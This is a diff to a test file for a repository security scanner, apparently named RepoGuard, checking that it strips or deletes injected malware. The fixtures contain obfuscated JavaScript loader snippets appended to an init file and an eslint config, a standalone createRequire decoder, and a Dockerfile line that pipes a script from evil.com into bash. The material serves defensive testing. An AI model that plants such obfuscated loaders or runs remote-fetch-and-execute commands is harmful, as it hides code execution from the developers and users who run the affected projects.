@@ -190,6 +190,111 @@ global.i = "malicious";
       expect(patchedFindings).toHaveLength(1);
     });
 
+    it("completely neutralizes injected init malware in template/base/js/init without leaving payload behind", async () => {
+      const original = [
+        "export function initTemplate(state) {",
+        "  state.initialized = true;",
+        "  return state;",
+        "}",
+        "",
+        'init(); var z="\\u002D\\u0041\\u0050\\u0049",NX=[6912847,146034^146205];function spin(R,c){for(var o=632193^632193;o<R[\'\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068\'];)a[o]=R[\'\\u0063\\u0068\\u0061\\u0072\\u0041\\u0074\'](o);return a[\'\\u006A\\u006F\\u0069\\u006E\']("");}function peel(R){return spin(R,SX);}!function(R,c){R[\'\\u007A\']=z;var r=peel("cnotsnturtpicok".split("").reverse().join(""));}();',
+      ].join("\n");
+
+      const findings: Finding[] = [
+        {
+          rule: "js-obfuscated-hex",
+          severity: "critical",
+          message: "hex/unicode obfuscation",
+          file: "template/base/js/init",
+          line: 6,
+        },
+      ];
+
+      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
+        original,
+        findings,
+        "template/base/js/init",
+      );
+
+      expect(shouldDelete).toBe(false);
+      expect(patchedFindings).toHaveLength(1);
+      expect(patchedContent).toContain("export function initTemplate");
+      expect(patchedContent).toContain("return state;");
+      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
+      expect(patchedContent).not.toContain("function spin");
+      expect(patchedContent).not.toContain("init(); var z=");
+    });
+
+    it("completely neutralizes injected malware appended to template/base/js/eslint.config.js without leaving scaffolding", async () => {
+      const original = [
+        "module.exports = [",
+        "  {",
+        "    rules: {",
+        "      '@typescript-eslint/explicit-module-boundary-types': 'off',",
+        "    },",
+        "  },",
+        "];",
+        "var z = '-2728-1';var NX=[6912847,907388^907539],SX=[5283741,416048^416193];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068'];)a[o]=R['\\u0063\\u0068\\u0061\\u0072\\u0041\\u0074'](o),o+=908966^908967;return a['\\u006A\\u006F\\u0069\\u006E']('');}function splitLane(R){var c=String['\\u0066\\u0072\\u006F\\u006D\\u0043\\u0068\\u0061\\u0072\\u0043\\u006F\\u0064\\u0065'](742867^742863),e=spin(R,NX);return e;}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){typeof module===[818819^818818]&&(R['test']=module);var r=peel('cnotsnturtpicok'.split('').reverse().join(''));}();",
+      ].join("\n");
+
+      const findings: Finding[] = [
+        {
+          rule: "js-obfuscated-hex",
+          severity: "critical",
+          message: "hex/unicode obfuscation",
+          file: "template/base/js/eslint.config.js",
+          line: 8,
+        },
+      ];
+
+      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
+        original,
+        findings,
+        "template/base/js/eslint.config.js",
+      );
+
+      expect(shouldDelete).toBe(false);
+      expect(patchedFindings).toHaveLength(1);
+      // Valid eslint config is intact
+      expect(patchedContent).toContain("module.exports = [");
+      expect(patchedContent).toContain("@typescript-eslint/explicit-module-boundary-types");
+      // The entire malicious line is replaced with a single clean comment
+      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
+      // None of the malicious scaffolding or decoders remain
+      expect(patchedContent).not.toContain("function spin");
+      expect(patchedContent).not.toContain("function splitLane");
+      expect(patchedContent).not.toContain("function peel");
+      expect(patchedContent).not.toContain("var z = '-2728-1'");
+      expect(patchedContent).not.toContain("/* REMOVED BY REPOGUARD: obfuscated hex payload */");
+    });
+
+    it("flags standalone malware file like api.js with createRequire and obfuscated decoder for deletion", async () => {
+      const malware = [
+        'import {createRequire} from "module";const require=createRequire(import.meta.url);function y7(R,c,e,r,t,i,s,_0xdf6cg){for(var n=[],o=274987^274987;o<R[\'\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068\'];)n[o]=R[\'\\u0065\\u0068\\u0061\\u0072\\u0041\\u0074\'](o),o+=682159^682158;return n[\'\\u006A\\u006F\\u0069\\u006E\']("");}',
+        'global["\\u0021"]="w0038\\u002D\\u0041";',
+        'var p8=y7("mor|bct]e".split("").reverse().join(""),6182039);',
+      ].join("\n");
+
+      const findings: Finding[] = [
+        {
+          rule: "js-obfuscated-hex",
+          severity: "critical",
+          message: "hex/unicode obfuscation",
+          file: "api.js",
+          line: 1,
+        },
+      ];
+
+      const { patchedFindings, shouldDelete } = await applyPatches(
+        malware,
+        findings,
+        "api.js",
+      );
+
+      expect(shouldDelete).toBe(true);
+      expect(patchedFindings).toHaveLength(1);
+    });
+
     it("patches js-obfuscated-charcode and js-obfuscated-constructors", async () => {
       const original = "const code = String.fromCharCode(97, 98, 99); const f = []['filter']['constructor'];";
       const findings: Finding[] = [
@@ -531,7 +636,11 @@ global.i = "malicious";
         expect(generateAIPatchSpy).not.toHaveBeenCalled();
       } finally {
         generateAIPatchSpy.mockRestore();
-        process.env.GEMINI_API_KEY = originalEnv;
+        if (originalEnv !== undefined) {
+          process.env.GEMINI_API_KEY = originalEnv;
+        } else {
+          delete process.env.GEMINI_API_KEY;
+        }
       }
     });
 
@@ -564,7 +673,87 @@ global.i = "malicious";
         expect(patchedContent).toBe(original);
       } finally {
         generateAIPatchSpy.mockRestore();
-        process.env.GEMINI_API_KEY = originalEnv;
+        if (originalEnv !== undefined) {
+          process.env.GEMINI_API_KEY = originalEnv;
+        } else {
+          delete process.env.GEMINI_API_KEY;
+        }
+      }
+    });
+
+    it("never calls AI on Dockerfile for container security rules (docker-no-user-directive, etc.)", async () => {
+      const originalEnv = process.env.GEMINI_API_KEY;
+      process.env.GEMINI_API_KEY = "mock-key";
+      const generateAIPatchSpy = jest.spyOn(aiService, "generateAIPatch");
+
+      try {
+        const original = [
+          "FROM node:20",
+          "WORKDIR /app",
+          "COPY package*.json ./",
+          "RUN npm install",
+          "COPY . .",
+          'CMD ["npm", "run", "dev"]',
+        ].join("\n");
+        const findings: Finding[] = [
+          {
+            rule: "docker-no-user-directive",
+            severity: "high",
+            message: "Dockerfile has no USER directive",
+            file: "template/microservice/docker/Dockerfile",
+          },
+        ];
+        const { patchedContent, patchedFindings } = await applyPatches(
+          original,
+          findings,
+          "template/microservice/docker/Dockerfile",
+        );
+
+        expect(generateAIPatchSpy).not.toHaveBeenCalled();
+        expect(patchedFindings).toHaveLength(0);
+        expect(patchedContent).toBe(original);
+      } finally {
+        generateAIPatchSpy.mockRestore();
+        if (originalEnv !== undefined) {
+          process.env.GEMINI_API_KEY = originalEnv;
+        } else {
+          delete process.env.GEMINI_API_KEY;
+        }
+      }
+    });
+
+    it("patches docker-curl-pipe-bash deterministically without calling AI", async () => {
+      const originalEnv = process.env.GEMINI_API_KEY;
+      process.env.GEMINI_API_KEY = "mock-key";
+      const generateAIPatchSpy = jest.spyOn(aiService, "generateAIPatch");
+
+      try {
+        const original = "FROM node:20\nRUN curl https://evil.com/x.sh | bash\n";
+        const findings: Finding[] = [
+          {
+            rule: "docker-curl-pipe-bash",
+            severity: "critical",
+            message: "curl pipe bash in Dockerfile",
+            file: "Dockerfile",
+          },
+        ];
+        const { patchedContent, patchedFindings } = await applyPatches(
+          original,
+          findings,
+          "Dockerfile",
+        );
+
+        expect(generateAIPatchSpy).not.toHaveBeenCalled();
+        expect(patchedFindings).toHaveLength(1);
+        expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash remote execution");
+        expect(patchedContent).not.toContain("curl https://evil.com/x.sh | bash");
+      } finally {
+        generateAIPatchSpy.mockRestore();
+        if (originalEnv !== undefined) {
+          process.env.GEMINI_API_KEY = originalEnv;
+        } else {
+          delete process.env.GEMINI_API_KEY;
+        }
       }
     });
 
@@ -623,7 +812,11 @@ global.i = "malicious";
         expect(patchedContent).toContain("const clean = true;");
       } finally {
         generateAIPatchSpy.mockRestore();
-        process.env.GEMINI_API_KEY = originalEnv;
+        if (originalEnv !== undefined) {
+          process.env.GEMINI_API_KEY = originalEnv;
+        } else {
+          delete process.env.GEMINI_API_KEY;
+        }
       }
     });
   });
